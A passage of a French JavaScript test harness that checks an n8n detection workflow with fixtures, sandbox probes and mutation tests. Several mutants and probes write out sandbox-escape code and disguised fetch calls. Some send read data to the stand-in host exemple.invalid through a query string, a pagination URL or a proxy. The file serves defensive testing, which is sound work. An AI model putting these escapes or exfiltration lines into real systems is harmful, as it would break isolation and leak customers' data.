  'Lire comptes': [{ id: A1, plan: 'studio', est_demo: false, suppression_demandee_le: null, leads_pause: false }, { id: A2, plan: 'signature', est_demo: false, suppression_demandee_le: null, leads_pause: false }],
  'Lire factures': [
    { id: u(101), artisan_id: A2, devis_id: null, statut: 'emise', date_echeance: '2026-10-23', total_ttc: 1200, avoir_de: null, payee_le: null, type_facture: 'standard' },
    { id: u(102), artisan_id: A1, devis_id: null, statut: 'emise', date_echeance: '2026-10-30', total_ttc: 500, avoir_de: null, payee_le: null, type_facture: null },
    { id: u(103), artisan_id: A2, devis_id: u(202), statut: 'payee', date_echeance: '2026-09-30', total_ttc: 900, avoir_de: null, payee_le: '2026-09-28', type_facture: 'acompte' },
    { id: u(104), artisan_id: A1, devis_id: null, statut: 'emise', date_echeance: '2026-10-20', total_ttc: 700, avoir_de: null, payee_le: null, type_facture: 'standard' },
  ],
  'Lire devis': [
    { id: u(201), artisan_id: A1, statut: 'accepte', date_emission: '2026-10-20', validite_jours: 90, acompte_pct: 30, total_ttc: 2000, lead_id: null, accepte_le: '2026-10-25T10:00:00+00:00', envoye_le: '2026-10-20T09:00:00+00:00', created_at: '2026-10-20T08:00:00+00:00' },
    { id: u(202), artisan_id: A2, statut: 'accepte', date_emission: '2026-09-01', validite_jours: 90, acompte_pct: 0, total_ttc: 3000, lead_id: null, accepte_le: '2026-09-05T10:00:00+00:00', envoye_le: '2026-09-01T09:00:00+00:00', created_at: '2026-09-01T08:00:00+00:00' },
    { id: u(203), artisan_id: A1, statut: 'envoye', date_emission: '2026-10-26', validite_jours: 90, acompte_pct: 0, total_ttc: 800, lead_id: null, accepte_le: null, envoye_le: '2026-10-26T09:00:00+00:00', created_at: '2026-10-26T08:00:00+00:00' },
    { id: u(204), artisan_id: A2, statut: 'envoye', date_emission: '2026-08-09', validite_jours: 90, acompte_pct: 0, total_ttc: 1500, lead_id: null, accepte_le: null, envoye_le: '2026-08-09T09:00:00+00:00', created_at: '2026-08-09T08:00:00+00:00' },
    { id: u(205), artisan_id: A2, statut: 'envoye', date_emission: '2026-10-26', validite_jours: 90, acompte_pct: 0, total_ttc: 400, lead_id: null, accepte_le: null, envoye_le: '2026-10-26T09:00:00+00:00', created_at: '2026-10-26T08:00:00+00:00' },
  ],
  'Lire demandes': [
    { id: u(301), artisan_id: A1, statut: 'nouveau', urgence: 'urgent', type_chantier: null, prise_en_main: false, created_at: '2026-10-30T10:00:00+00:00', updated_at: '2026-10-30T10:00:00+00:00' },
    { id: u(302), artisan_id: A2, statut: 'nouveau', urgence: null, type_chantier: null, prise_en_main: false, created_at: '2026-11-01T10:00:00+00:00', updated_at: '2026-11-01T10:00:00+00:00' },
    { id: u(303), artisan_id: A2, statut: 'en_discussion', urgence: null, type_chantier: 'Plomberie', prise_en_main: false, created_at: '2026-09-01T10:00:00+00:00', updated_at: '2026-10-31T18:00:00+00:00' },
  ],
  'Lire chantiers': [
    { id: u(401), artisan_id: A2, devis_id: u(202), statut: 'termine', date_fin_reelle: '2026-10-30', maj_le: '2026-10-30T17:00:00+00:00' },
    { id: u(402), artisan_id: A2, devis_id: null, statut: 'en_cours', date_fin_reelle: null, maj_le: '2026-10-31T17:00:00+00:00' },
    { id: u(403), artisan_id: A2, devis_id: null, statut: 'termine', date_fin_reelle: '2025-11-20', maj_le: '2025-11-20T17:00:00+00:00' },
  ],
  'Lire reservations': [{ id: u(501), artisan_id: A2, chantier_id: u(402), materiau_id: u(601), quantite: 5, statut: 'reserve' }],
  'Lire materiaux': [{ id: u(601), artisan_id: A2, seuil_alerte: 0 }, { id: u(602), artisan_id: A1, seuil_alerte: 3 }],
  'Lire stock': [{ id: u(701), materiau_id: u(601), quantite: 2 }, { id: u(702), materiau_id: u(602), quantite: 1 }],
  'Lire commandes': [{ id: u(61), artisan_id: A1, statut: 'commandee', chantier_id: u(499) }],
  'Lire relances impayes': [{ id: u(801), artisan_id: A2, facture_id: u(101), rang: 1, jour: '2026-10-26', statut: 'envoyee' }],
  'Lire arrets de relance': [{ facture_id: u(104), artisan_id: A1, raison: 'reponse_client', le: '2026-10-31T09:00:00+00:00', reprise_le: null }],
  'Lire reglages des relances': [{ artisan_id: A2, actif: true, jours: [3, 10, 21] }],
  'Lire reglages de la plateforme': [{ artisan_id: A1, mode_reponse: 'assistee' }, { artisan_id: A2, mode_reponse: 'auto' }],
  'Lire tarifs': [{ id: u(901), artisan_id: A1, actif: true }],
  'Lire apres chantier': [{ artisan_id: A2, avis: true, entretien: true, actif_depuis: null }],
  'Lire rappels': [{ id: u(951), artisan_id: A2, chantier_id: u(403), type: 'entretien', echeance: '2026-10-28', fait_le: null, envoye_le: null, origine: 'systeme', cle: `entretien:${u(403)}:1` }],
  'Lire reglages du pilote': [{ artisan_id: A2, actif: true, types: { relance_impaye: true, relance_devis: true } }],
  'Lire cartes refusees': [{ id: u(971), artisan_id: A1, outil: 'relancer_devis', statut: 'refusee', objet_id: u(203), maj_le: '2026-10-31T08:00:00+00:00' }],
}
const JOUR_ESSAI = '2026-11-02'
// Bilan rendu par n8n (test_workflow sur DONNEES_ESSAI épinglées, exécution n° EXECUTION_ESSAI), recopié de .orchestre/preuves/032-019/essai-n8n.json.
const EXECUTION_ESSAI = '335'
const BILAN_ESSAI = '1:2:170000:0/1/1 11:1:70000:0/1/0 2:2:410000:0/2/0 3:1:60000:0/1/0 4:1:40000:0/0/1 8:1:150000:0/0/1 5:0:0:0/0/0 6:3:0:0/3/0 7:1:0:0/1/0 9:2:0:0/2/0 10:1:0:0/1/0 12:1:0:0/1/0 0:7:840000:0/4/3'
const bilanTexte = (bilan) => bilan.map((b) => `${b.numero}:${b.nombre}:${b.montant_total_centimes}:${b.par_niveau['1']}/${b.par_niveau['2']}/${b.par_niveau['3']}`).join(' ')
async function essaiN8n(wf) {
  const e = []
  try {
    const { bilan, constats } = await passer(wf, DONNEES_ESSAI, JOUR_ESSAI)
    controler('essai n8n', DONNEES_ESSAI, constats, (m) => e.push(m))
    const obtenu = bilanTexte(bilan)
    STATS.essai = obtenu
    if (obtenu !== BILAN_ESSAI) e.push(`bilan de l'essai n8n différent : ${obtenu}`)
    // Le fichier de preuve doit porter le même jeu et le même bilan (ce que n8n a rendu, pas ce que le juge calcule).
    const p = path.join(RACINE, '.orchestre/preuves/032-019/essai-n8n.json')
    const essai = JSON.parse(readFileSync(p, 'utf8'))
    if (String(essai.execution) !== EXECUTION_ESSAI) e.push(`essai-n8n.json : exécution ${essai.execution}, ${EXECUTION_ESSAI} attendue`)
    if (bilanTexte(essai.bilan_rendu_par_n8n ?? []) !== BILAN_ESSAI) e.push('essai-n8n.json : le bilan rendu par n8n diffère de celui épinglé ici')
    for (const l of LECTURES(wf)) if (!DONNEES_ESSAI[l]?.length || !essai.pin_data?.[l]?.length) e.push(`essai : la lecture « ${l} » n'est pas épinglée (une lecture non épinglée part pour de vrai)`)
    for (const [nom, lignes] of Object.entries(DONNEES_ESSAI)) if (JSON.stringify((essai.pin_data?.[nom] ?? []).map((i) => i.json)) !== JSON.stringify(lignes)) e.push(`essai-n8n.json : données épinglées de « ${nom} » différentes du jeu du juge`)
  } catch (err) { e.push(`essai n8n : ${err.message}`) }
  return e
}

// ─── 6. É3 : le bac à sable prouve lui-même ses refus ─────────────────────────────────────────────────────────────────────────
// Le code d'évasion de l'annexe E de 032-010, à l'identique, puis une version qui rattrape chaque refus pour dire ce qu'elle atteint.
const EVASION_032_010 = "const g = Function('return this')(); return [{ json: { fetch_reel: typeof g['fe' + 'tch'], process_reel: typeof g['pro' + 'cess'], module_fs: typeof (g['pro' + 'cess'] && g['pro' + 'cess'].getBuiltinModule && g['pro' + 'cess'].getBuiltinModule('node:fs').writeFileSync) } }];"
const EVASION_RATTRAPEE = `const r = {};
const t = (k, f) => { try { const v = f(); r[k] = v === undefined || v === null ? 'rien' : typeof v } catch (e) { r[k] = 'refus' } };
t('global_par_Function', () => Function('return this')());
t('constructeur_hote', () => (function () {}).constructor('return process')());
t('constructeur_global', () => globalThis.constructor.constructor('return process')());
t('this_helpers', () => this['help' + 'ers']);
t('fetch', () => globalThis['fe' + 'tch']);
t('process', () => globalThis['pro' + 'cess']);
t('require', () => globalThis['req' + 'uire']);
t('eval_indirect', () => (0, globalThis['ev' + 'al'])('this'));
t('minuterie', () => globalThis['set' + 'Timeout']);
return [{ json: r }];`
async function bacASable() {
  const e = []
  const ko = (m) => e.push(m)
  try {
    const s = await BAC.demander({ type: 'sonde', fichier: EXPORT })
    STATS.sonde = s
    if (s.permission !== true) ko('bac à sable : le modèle de permissions de Node est inactif dans le processus enfant')
    for (const k of ['ecriture', 'lecture', 'processus', 'worker']) if (s[k] !== 'ERR_ACCESS_DENIED') ko(`bac à sable : ${k} ${s[k]} dans le processus enfant (ERR_ACCESS_DENIED attendu)`)
    const a = await BAC.demander({ type: 'executer', jsCode: EVASION_032_010, jour: JOUR })
    STATS.evasionE = a
    if (!a.erreur && !a.violations.length) ko(`bac à sable : l'évasion de l'annexe E (032-010) passe sans refus : ${JSON.stringify(a.items)}`)
    for (const x of a.items ?? []) for (const [k, v] of Object.entries(x ?? {})) if (v !== 'undefined') ko(`bac à sable : l'évasion de l'annexe E atteint ${k} (${v})`)
    const b = await BAC.demander({ type: 'executer', jsCode: EVASION_RATTRAPEE, jour: JOUR })
    STATS.evasionRattrapee = b
    const vu = b.items?.[0] ?? {}
    if (Object.keys(vu).length !== 9) ko(`bac à sable : l'évasion rattrapée n'a pas tout essayé (${JSON.stringify(vu)} ${b.erreur ?? ''})`)
    for (const [k, v] of Object.entries(vu)) if (v !== 'refus' && v !== 'rien') ko(`bac à sable : l'évasion rattrapée atteint ${k} (${v})`)
    if (b.violations.length < 6) ko(`bac à sable : les tentatives rattrapées ne sont pas toutes notées (${b.violations.join(', ')})`)
  } catch (err) { ko(`bac à sable : ${err.message}`) }
  return e
}

// ─── 7. M12 et rang 26 : « Preuve de connexion » et la branche d'erreur, rejouées dans le bac à sable ─────────────────────────
// 032-010 (M12) : une page HTML, une liste vide ou une autre table passaient pour « ok ». La preuve exige UNE ligne aux colonnes exactes de
// regles_automatisation (0050_pilotage.sql:47-52), et ne laisse rien descendre. Le message d'échec ne porte ni donnée lue ni texte d'erreur.
const LIGNE_REGLES = { artisan_id: u(1), prereglage: 'equilibre', maillons: { devis_auto: false }, actif: true, maj_le: '2026-11-01T10:00:00+00:00' }
async function branches(wf) {
  const e = []
  const ko = (m) => e.push(m)
  const essai = async (titre, entree, doitPasser) => {
    try {
      const items = await executer(wf, 'Preuve de connexion', JOUR, entree)
      if (!doitPasser) ko(`Preuve de connexion (M12) : ${titre} passe pour une connexion ok (${JSON.stringify(items).slice(0, 120)})`)
      else if (JSON.stringify(items) !== JSON.stringify([{ connexion: 'ok', lignes: 1 }])) ko(`Preuve de connexion (M12) : ${titre} : sortie ${JSON.stringify(items).slice(0, 120)}, { connexion: 'ok', lignes: 1 } attendu`)
    } catch (err) {
      if (/bac à sable/.test(err.message)) ko(`Preuve de connexion : ${err.message}`)
      else if (doitPasser) ko(`Preuve de connexion (M12) : ${titre} refusée à tort (${err.message})`)
    }
  }
  await essai('une vraie ligne', [LIGNE_REGLES], true)
  await essai('aucune ligne (hôte qui rend [])', [{}], false)
  await essai('une page HTML découpée en clés (exécution 319)', [{ 0: '<', 1: '!', 2: 'D', 3: 'O' }], false)
  await essai('deux lignes', [LIGNE_REGLES, { ...LIGNE_REGLES, artisan_id: u(2) }], false)
  await essai('une ligne d’une autre table (colonne en plus)', [{ ...LIGNE_REGLES, email: 'x@exemple.invalid' }], false)
  await essai('une ligne sans maillons', [{ ...LIGNE_REGLES, maillons: null }], false)
  await essai('un identifiant de compte qui n’est pas un uuid', [{ ...LIGNE_REGLES, artisan_id: 'abc' }], false)
  // Le message d'échec : exactement ses quatre clés, rien de l'erreur (qui peut citer une ligne lue).
  try {
    const secret = 'Dupont 12 rue des Lilas'
    const items = await executer(wf, 'Message d échec', JOUR, [{ execution: { id: '421', mode: 'trigger', lastNodeExecuted: 'Preuve de connexion', error: { message: secret } }, workflow: { id: 'x', name: 'presti-detecteurs' } }])
    if (items.length !== 1 || !clesExactes(items[0], CLES_ALERTE)) ko(`Message d échec (rang 26) : clés ${Object.keys(items[0] ?? {}).join(', ')}, ${CLES_ALERTE.join(', ')} attendues`)
    if (JSON.stringify(items).includes('Dupont') || JSON.stringify(items).includes('Lilas')) ko('Message d échec (rang 26) : le texte de l’erreur descend dans l’alerte')
    if (items[0]?.noeud !== 'Preuve de connexion' || items[0]?.execution !== '421') ko(`Message d échec (rang 26) : nœud ou exécution perdus (${JSON.stringify(items[0])})`)
    const vide = await executer(wf, 'Message d échec', JOUR, [{}])
    if (vide[0]?.noeud !== 'inconnu') ko('Message d échec (rang 26) : une erreur sans détail doit dire « inconnu »')
  } catch (err) { ko(`Message d échec (rang 26) : ${err.message}`) }
  return e
}

// La sonde du bac à sable ne dépend pas du workflow : elle tourne sur la suite principale, pas sur chaque mutant.
// Un mutant s'arrête à la première phase qui le fait rougir POUR SA RAISON (`attendu`) : les phases suivantes ne changeraient pas son
// verdict, et la suite reste sous quelques minutes (032-019 : 109 mutants). La suite principale, elle, joue toujours toutes les phases.
async function suite(wf, { avecEmpreintes = true, avecSonde = false, attendu = null } = {}) {
  const phases = [() => (avecSonde ? bacASable() : []), () => (avecEmpreintes ? empreintes(wf) : []), () => structure(wf), () => copies(wf), () => branches(wf), () => cas(wf), () => proprietes(wf), () => essaiN8n(wf)]
  const e = []
  for (const p of phases) {
    e.push(...await p())
    if (attendu && e.some((m) => attendu.test(m))) break
  }
  return e
}

// ─── Les mutants : chacun doit faire rougir la suite ──────────────────────────────────────────────────────────────────────────
// Un mutant du code est jugé SANS les empreintes (sinon l'empreinte seule le verrait toujours) : il prouve le rejeu, le test par
// propriété ou le bac à sable. `attendu` nomme la raison qui doit le faire rougir ; une autre raison ne compte pas.
function mutantCode(nom, de, vers) {
  const f = (wf) => {
    const m = copie(wf)
    const n = noeud(m, nom)
    for (const [a, b] of Array.isArray(de) ? de : [[de, vers]]) {
      if (!n.parameters.jsCode.includes(a)) throw new Error(`mutant introuvable dans ${nom} : ${a}`)
      n.parameters.jsCode = n.parameters.jsCode.replace(a, b)
    }
    return m
  }
  f.code = true
  return f
}
function mutantNoeud(nom, f) { return (wf) => { const m = copie(wf); f(noeud(m, nom), m); return m } }
const pagination = (n) => n.parameters.options.pagination.pagination
const MUTANTS = [
  ['n° 4 : comparateur de validité inversé (age > validite → age < validite)', mutantCode('Détecteur 04 devis sans réponse', 'if (age > validite(d)) continue;', 'if (age < validite(d)) continue;')],
  ['n° 1 : J+3 pile manqué (>= → >)', mutantCode('Détecteur 01 facture échue', 'retard >= x.jour', 'retard > x.jour')],
  ['n° 6 : étape inversée (>= → <)', mutantCode('Détecteur 06 demande sans réponse', 'age >= j', 'age < j')],
  ['n° 8 : borne inversée (> → <)', mutantCode('Détecteur 08 devis bientôt expiré', 'restant > S.devis_expire_avant_jours', 'restant < S.devis_expire_avant_jours')],
  ['n° 10 : J+2 pile manqué (< → <=)', mutantCode('Détecteur 10 demande d avis', 'age < S.avis_delai', 'age <= S.avis_delai')],
  ['n° 5 rallumé', mutantCode('Détecteur 05 facture jamais envoyée (coupé)', 'return [{ json: { constats: avant } }];', "return [{ json: { constats: avant.concat([{ numero: 5, detecteur: 'facture_jamais_envoyee', cle: 'facture_jamais_envoyee:x:j0', artisan_id: avant[0] && avant[0].artisan_id }]) } }];")],
  ['niveau : pilote et capacités d’envoi ignorés', mutantCode('Niveau proposé selon l offre', "l.includes('assistant.pilote') && d.auto.every((x) => l.includes(x))", 'true')],
  ['niveau : plafond du détecteur ignoré', mutantCode('Niveau proposé selon l offre', 'return Math.min(n, d.max);', "return d.outil === 'creer_devis' ? 3 : Math.min(n, d.max);")],
  ['constat qui porte un e-mail', mutantCode('Détecteur 04 devis sans réponse', "constat(4, 'devis_sans_reponse'", "nouveaux.push({ numero: 4, cle: 'devis_sans_reponse:' + d.id + ':x', client_email: 'x', artisan_id: d.artisan_id, niveau: 2 }); constat(4, 'devis_sans_reponse'")],
  ['copie des capacités faussée (crm retiré)', mutantCode('Capacités des offres', "'crm', 'assistant.pilote'", "'assistant.pilote'")],
  ['décision par le nom de l’offre', mutantCode('Niveau proposé selon l offre', "let n = l.includes('assistant') ? 2 : 1;", "let n = comptes.get(c.artisan_id).plan === 'studio' ? 2 : (l.includes('assistant') ? 2 : 1);")],
  ['colonne interdite dans select= (client_email)', mutantNoeud('Lire factures', (n) => { n.parameters.queryParameters.parameters[0].value += ',client_email' })],
  ['colonne hors liste (objet)', mutantNoeud('Lire devis', (n) => { n.parameters.queryParameters.parameters[0].value += ',objet' })],
  ['lecture HTTP en POST', mutantNoeud('Lire chantiers', (n) => { n.parameters.method = 'POST' })],
  ['nœud Supabase qui écrit', mutantNoeud('Lecture de connexion (regles_automatisation)', (n) => { n.parameters.operation = 'update' })],
  ['nœud Slack ajouté', (wf) => { const m = copie(wf); m.nodes.push({ name: 'Avertir', type: 'n8n-nodes-base.slack', parameters: {} }); return m }],
  ['appel réseau dans un nœud Code', mutantCode('Bilan par détecteur', 'const vues = new Set();', "const vues = new Set(); fetch('https://exemple.invalid');")],
  ['workflow actif', (wf) => { const m = copie(wf); m.active = true; return m }],

  // ── É1 (032-010, annexe A : C2, C3, C4, puis les autres portes de sortie d'un nœud HTTP) ──
  ['É1 C2 pagination « next URL » vers un hôte tiers, avec l’identifiant', mutantNoeud('Lire factures', (n) => {
    const pg = pagination(n)
    pg.paginationMode = 'responseContainsNextURL'; delete pg.parameters
    pg.nextURL = "={{ 'https://exemple.invalid/collecte?d=' + encodeURIComponent(JSON.stringify($response.body)) }}"
    pg.paginationCompleteWhen = 'other'; pg.completeExpression = '={{ $pageCount >= 1 }}'
  }), { attendu: /pagination/ }],
  ['É1 C3 proxy sortant sur une lecture', mutantNoeud('Lire factures', (n) => { n.parameters.options.proxy = 'http://exemple.invalid:8080' }), { attendu: /options HTTP hors gabarit/ }],
  ['É1 C4 certificats non vérifiés', mutantNoeud('Lire factures', (n) => { n.parameters.options.allowUnauthorizedCerts = true }), { attendu: /options HTTP hors gabarit/ }],
  ['É1 redirections suivies', mutantNoeud('Lire devis', (n) => { n.parameters.options.redirect = { redirect: { followRedirects: true, maxRedirects: 21 } } }), { attendu: /options HTTP hors gabarit/ }],
  ['É1 réponse complète (en-têtes rendus)', mutantNoeud('Lire devis', (n) => { n.parameters.options.response = { response: { fullResponse: true } } }), { attendu: /options HTTP hors gabarit/ }],
  ['É1 pagination : 5 000 pages', mutantNoeud('Lire comptes', (n) => { pagination(n).maxRequests = 5000 }), { attendu: /maxRequests/ }],
  ['É1 pagination sans plafond de pages', mutantNoeud('Lire comptes', (n) => { pagination(n).limitPagesFetched = false }), { attendu: /limitPagesFetched/ }],
  ['É1 pagination : fin jamais atteinte', mutantNoeud('Lire stock', (n) => { pagination(n).completeExpression = '={{ false }}' }), { attendu: /fin de pagination/ }],
  ['É1 pagination : un second paramètre (en-tête)', mutantNoeud('Lire stock', (n) => { pagination(n).parameters.parameters.push({ type: 'header', name: 'X-Suite', value: '={{ $response.body[0] }}' }) }), { attendu: /un seul paramètre qs offset/ }],
  ['É1 pagination : offset changé en select', mutantNoeud('Lire stock', (n) => { pagination(n).parameters.parameters[0].name = 'select'; pagination(n).parameters.parameters[0].value = '*' }), { attendu: /un seul paramètre qs offset/ }],
  ['É1 délai d’attente porté à 10 minutes', mutantNoeud('Lire tarifs', (n) => { n.parameters.options.timeout = 600000 }), { attendu: /timeout/ }],
  ['É1 second identifiant (en-tête générique)', mutantNoeud('Lire tarifs', (n) => { n.credentials.httpHeaderAuth = { id: 'x', name: 'Autre' } }), { attendu: /un seul identifiant/ }],
  ['É1 paramètre HTTP hors gabarit (sendHeaders posé à faux)', mutantNoeud('Lire tarifs', (n) => { n.parameters.sendHeaders = false }), { attendu: /paramètres HTTP hors gabarit/ }],
  ['É1 option de nœud hors gabarit (onError)', mutantNoeud('Lire tarifs', (n) => { n.onError = 'continueErrorOutput' }), { attendu: /clé de nœud non permise/ }],
  ['M10 (au passage) workflow d’erreur branché', (wf) => { const m = copie(wf); m.settings.errorWorkflow = 'AutreWorkflowQuiPosteSurSlack'; return m }, { attendu: /settings\.errorWorkflow/ }],

  // ── É2 (032-010, annexe A : D1-D6) — jugés sans les empreintes ──
  ['É2 D1 niveau 3 en Studio sur le n° 8 seulement', mutantCode('Niveau proposé selon l offre', 'if (peutPartirSeul) n = 3;', "if (peutPartirSeul || (c.numero === 8 && l.includes('relances'))) n = 3;"), { attendu: /plafond/ }],
  ['É2 D2 facture (creer_facture) au niveau 3 en Entreprise, n° 2', mutantCode('Niveau proposé selon l offre', 'offre: comptes.get(c.artisan_id).plan, niveau,', "offre: comptes.get(c.artisan_id).plan, niveau: (c.numero === 2 && l.includes('organisation.membres')) ? 3 : niveau,"), { attendu: /plafond|geste §3\.2/ }],
  ['É2 D3 n° 7 au niveau 3 en Entreprise', mutantCode('Niveau proposé selon l offre', 'offre: comptes.get(c.artisan_id).plan, niveau,', "offre: comptes.get(c.artisan_id).plan, niveau: (c.numero === 7 && l.includes('organisation.membres')) ? 3 : niveau,"), { attendu: /plafond/ }],
  ['É2 D4 niveau 3 en Studio en mode « auto » (n° 6, dès J+3)', mutantCode('Niveau proposé selon l offre', 'if (peutPartirSeul) n = 3;', "if (peutPartirSeul || (c.numero === 6 && modeAuto.has(c.artisan_id) && !l.includes('crm') && c.jours >= 3)) n = 3;"), { attendu: /plafond/ }],
  ['É2 D5 Studio niveau 3 sur le n° 9 (stock, CRM absent)', mutantCode('Niveau proposé selon l offre', 'return Math.min(n, d.max);', "return (c.numero === 9 && c.objet.type === 'materiau') ? 3 : Math.min(n, d.max);"), { attendu: /plafond/ }],
  ['É2 D6 facture d’acompte au niveau 3 en Signature dès 1 000 €', mutantCode('Niveau proposé selon l offre', 'offre: comptes.get(c.artisan_id).plan, niveau,', "offre: comptes.get(c.artisan_id).plan, niveau: (c.numero === 3 && c.montant_centimes >= 100000 && l.includes('assistant.pilote')) ? 3 : niveau,"), { attendu: /plafond|geste §3\.2/ }],
  ['É2 n° 1 au niveau 3 en Signature sans impayés cochés', mutantCode('Niveau proposé selon l offre', 'if (peutPartirSeul) n = 3;', "if (peutPartirSeul || (c.numero === 1 && l.includes('assistant.pilote') && c.montant_centimes >= 1000000)) n = 3;"), { attendu: /plafond/ }],
  ['É2 outil de la facture renommé pour sortir de OUTILS_JAMAIS_AUTO', mutantCode('Niveau proposé selon l offre', "2: { outil: 'creer_facture', max: 2,", "2: { outil: 'preparer_facture', max: 3,"), { attendu: /outil preparer_facture/ }],

  // ── É3 (032-010, annexe A : C5, C6, annexe E) — jugés sans les empreintes : le bac à sable doit les arrêter ──
  ['É3 C5 appel réseau masqué (this[\'help\'+\'ers\'][\'http\'+\'Request\'])', mutantCode('Bilan par détecteur', 'const vues = new Set();', "const vues = new Set(); const h = (typeof this === 'object' && this) ? this['help' + 'ers'] : null; if (h && h['http' + 'Request']) h['http' + 'Request']({ url: 'https://exemple.invalid' });"), { attendu: /bac à sable/ }],
  ['É3 C6 fetch masqué (globalThis par Function)', mutantCode('Bilan par détecteur', 'const vues = new Set();', "const vues = new Set(); const f = Function('return this')()['fe' + 'tch']; void f;"), { attendu: /bac à sable/ }],
  ['É3 annexe E : process et disque par Function, refus rattrapé', mutantCode('Bilan par détecteur', 'const vues = new Set();', "const vues = new Set(); try { const g = Function('return this')(); g['pro' + 'cess'].getBuiltinModule('node:fs').writeFileSync('x', 'y'); } catch (e) { /* silence */ }"), { attendu: /bac à sable/ }],
  ['É3 constructeur de l’hôte (this.constructor.constructor), rattrapé', mutantCode('Détecteur 01 facture échue', 'const nouveaux = [];', "const nouveaux = []; try { ({}).constructor.constructor('return process')(); } catch (e) { /* silence */ }"), { attendu: /bac à sable/ }],
  ['É3 minuterie masquée (setTimeout)', mutantCode('Détecteur 06 demande sans réponse', 'const nouveaux = [];', "const nouveaux = []; try { globalThis['set' + 'Timeout'](() => 0, 1); } catch (e) { /* silence */ }"), { attendu: /bac à sable/ }],
  ['É3 empreinte : un espace ajouté au code audité', mutantCode('Bilan par détecteur', 'const vues = new Set();', 'const vues = new Set(); '), { avecEmpreintes: true, attendu: /nouvel audit requis/ }],
  ['É3 empreinte : fetch masqué dans un nœud non rejoué (Preuve de connexion)', mutantCode('Preuve de connexion', "return [{ json: { connexion: 'ok', lignes: 1 } }];", "try { Function('return this')()['fe' + 'tch']('https://exemple.invalid/?d=' + encodeURIComponent(JSON.stringify(rendus))); } catch (e) { /* silence */ } return [{ json: { connexion: 'ok', lignes: 1 } }];"), { avecEmpreintes: true, attendu: /nouvel audit requis/ }],
  ['É3 empreinte : nœud Code ajouté', (wf) => { const m = copie(wf); m.nodes.push({ id: 'x', name: 'Code ajouté', type: 'n8n-nodes-base.code', typeVersion: 2, position: [0, 0], parameters: { mode: 'runOnceForAllItems', language: 'javaScript', jsCode: 'return [];' } }); return m }, { attendu: /nouvel audit requis/ }],
  // ── Lot L12 (032-019) : M1 à M12, n° 11 et 12, rang 8, rang 26 — un mutant du code est jugé sans les empreintes ──
  ['M1 filtre est_demo retiré (comptes de démo au bilan)', mutantNoeud('Lire comptes', (n) => { n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'est_demo') }), { attendu: /M1/ }],
  ['M1 filtre suppression_demandee_le retiré', mutantNoeud('Lire comptes', (n) => { n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'suppression_demandee_le') }), { attendu: /M1/ }],
  ['M1 filtre plan=in.(…) élargi', mutantNoeud('Lire comptes', (n) => { n.parameters.queryParameters.parameters.find((q) => q.name === 'plan').value = 'not.is.null' }), { attendu: /M1/ }],
  ['M1 expression du compte neutralisée', mutantNoeud('Lire factures', (n) => { n.parameters.queryParameters.parameters.find((q) => q.name === 'artisan_id').value = "={{ 'not.is.null' }}" }), { attendu: /M1/ }],
  ['M1 filtre du stock retiré', mutantNoeud('Lire stock', (n) => { n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'materiau_id') }), { attendu: /M1/ }],
  ['M1 cartes refusées : fenêtre de 7 jours retirée', mutantNoeud('Lire cartes refusees', (n) => { n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'maj_le') }), { attendu: /M1/ }],
    ['M2 n° 2 : factures indexées par devis seul (tous comptes)', mutantCode('Détecteur 02 chantier à facturer', [['const k = paire(f.artisan_id, f.devis_id);', 'const k = f.devis_id;'], ['parDevis.get(paire(d.artisan_id, d.id))', 'parDevis.get(d.id)']]), { attendu: /2 M2/ }],
  ['M2 n° 1 : journal lu par facture seule', mutantCode('Détecteur 01 facture échue', 'e.facture_id === f.id && e.artisan_id === f.artisan_id', 'e.facture_id === f.id'), { attendu: /1 M2/ }],
    ['M2 n° 9 : commande d’un autre compte vaut couverture', mutantCode('Détecteur 09 stock sous le seuil', 'if (commandes.has(paire(c.artisan_id, c.id)) || vus.has(c.id)) continue;', "if ([...commandes].some((k) => k.endsWith('|' + c.id)) || vus.has(c.id)) continue;"), { attendu: /9 M2/ }],
  ['M3 pilote ignoré (niveau 3 sans pilote activé)', mutantCode('Niveau proposé selon l offre', '&& (!d.condition || d.condition(c.artisan_id)) && piloteOuvert(c, d);', '&& (!d.condition || d.condition(c.artisan_id));'), { attendu: /plafond/ }],
  ['M3 pause des demandes ignorée', mutantCode('Niveau proposé selon l offre', 'if (enPause.has(c.artisan_id)) return false;', ''), { attendu: /plafond|M3 pause/ }],
  ['M3 demande prise en main ignorée', mutantCode('Niveau proposé selon l offre', "if (c.numero === 6 && prises.has(paire(c.artisan_id, c.objet.id))) return false;", ''), { attendu: /plafond|prise en main/ }],
  ['M3 niveau 3 sans « réserve du pilote »', mutantCode('Niveau proposé selon l offre', "reserve: niveau === 3 ? 'pilote' : null", 'reserve: null'), { attendu: /sous réserve du pilote/ }],
  ['M4 n° 6 : en_discussion oublié', mutantCode('Détecteur 06 demande sans réponse', "s === 'nouveau' || s === 'en_discussion' ||", "s === 'nouveau' ||"), { attendu: /6 M4/ }],
  ['M4 n° 6 : statut vide oublié', mutantCode('Détecteur 06 demande sans réponse', "|| s === null || s === undefined || s === '';", ';'), { attendu: /6 M4/ }],
  ['M4 n° 7 : en_discussion oublié (comme 032-003)', mutantCode('Détecteur 07 demande sans devis', "s === 'nouveau' || s === 'en_discussion' ||", "s === 'nouveau' || s === 'en_cours' ||"), { attendu: /7 M4/ }],
  ['M5 n° 4 et n° 8 sur le même devis (fusion retirée)', mutantCode('Détecteur 08 devis bientôt expiré', 'const gardes = avant.filter((c) => !(c.numero === 4 && remplaces.has(paire(c.artisan_id, c.objet.id))));', 'const gardes = avant;'), { attendu: /M5/ }],
  ['M5 argent qui dort compté deux fois', mutantCode('Bilan par détecteur', "const k = c.artisan_id + '|' + c.argent.type + '|' + c.argent.id;", "const k = c.cle;"), { attendu: /M5|argent qui dort/ }],
  ['M6 écart minimal entre deux relances ignoré', mutantCode('Détecteur 01 facture échue', 'if (dernier && ecart(JOUR, dernier) < S.impayes_ecart_min) continue;', ''), { attendu: /1 M6/ }],
  ['M7 n° 10 : repli sur maj_le remis', mutantCode('Détecteur 10 demande d avis', 'const fin = jourParis(c.date_fin_reelle);', 'const fin = jourParis(c.date_fin_reelle) || jourParis(c.maj_le);'), { attendu: /10 M7/ }],
  ['M7 n° 10 : rappel « avis » fait ignoré', mutantCode('Détecteur 10 demande d avis', "if (faits.has(paire(c.artisan_id, 'avis:' + c.id))) continue;", ''), { attendu: /10 M7/ }],
